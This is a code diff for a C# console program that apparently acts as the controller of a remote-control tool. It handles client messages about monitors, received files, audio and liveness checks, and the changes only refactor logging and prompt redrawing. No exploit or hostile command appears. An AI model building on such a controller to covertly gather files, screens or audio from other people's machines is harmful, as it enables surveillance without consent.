@@ -118,6 +118,7 @@ namespace negnox.Classok
                             Console.WriteLine();
                             Console.Write($"{adat[1]} {adat[2]}");
                             LogTxt($"{adat[1]} {adat[2]}");
+                            if (isPromptLive) WritePrompt();
                             break;
                         case "rp":
                             Console.WriteLine();
@@ -144,14 +145,14 @@ namespace negnox.Classok
                                     Log($"|{adat[2 + i * 4]}| - fő monitor : {adat[3 + i * 4]} - x:{adat[4 + i * 4]} - y:{adat[5 + i * 4]}");
                                     Log("-------------------------------");
                                     Console.WriteLine();
-                                    if (isPromptLive) WritePrompt();
+                                    //if (isPromptLive) WritePrompt();
                                 }
                             }
                             catch (Exception)
                             {
                                 Log("$elkurtad nandi$");
                             }
-                            
+                            if (isPromptLive) WritePrompt();
                             break;
 
                         case "file":
@@ -169,8 +170,8 @@ namespace negnox.Classok
                             }
                             catch (Exception e)
                             {
-
-                                Console.WriteLine(e) ;
+                                Log(e.ToString());
+                                if (isPromptLive) WritePrompt();
                             }
                             
                             break;
@@ -234,10 +235,12 @@ namespace negnox.Classok
                         case "audio":
                             Console.WriteLine(adat[1]);
                             LogTxt(adat[1]);
+                            if (isPromptLive) WritePrompt();
                             break;
 
                         case "subcontrollerlist":
                             Log(adat[1]);
+                            if (isPromptLive) WritePrompt();
                             break;
 
                         case "imalive":
@@ -414,12 +417,10 @@ namespace negnox.Classok
         {
             hova = ".\\dataFromClients";
             string fileName = ReadLine(stream);
-            
-            Console.Write("[-] [ReadLine : ");
-            Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.Write(fileName);
+            Log("\n[-] [ReadLine : ", false);
+            Log(fileName, false, ConsoleColor.Magenta);
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.Write("]");
+            Log("]", false);
 
 
             receivedFileName = fileName;
@@ -428,12 +429,9 @@ namespace negnox.Classok
 
             //Console.WriteLine(ReadLine(stream));
             string asd = ReadLine(stream);
-            Console.Write("[-] [ReadLine : ");
-            Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.Write(asd.Trim());
-            Console.ForegroundColor = ConsoleColor.Gray;
-            Console.Write("]");
-            Console.WriteLine();
+            Log("\n[-] [ReadLine : ", false);
+            Log(asd.Trim(), false, ConsoleColor.Magenta);
+            Log("]");
 
 
             //Console.ForegroundColor = ConsoleColor.Red;
@@ -481,7 +479,7 @@ namespace negnox.Classok
 
                 bytes.Add((byte)b);
             }
-            Console.WriteLine();
+            //Console.WriteLine();
             //Console.ForegroundColor = ConsoleColor.Magenta;
             //Console.Write(Encoding.UTF8.GetString(bytes.ToArray()));
             //Console.ForegroundColor = ConsoleColor.Gray;
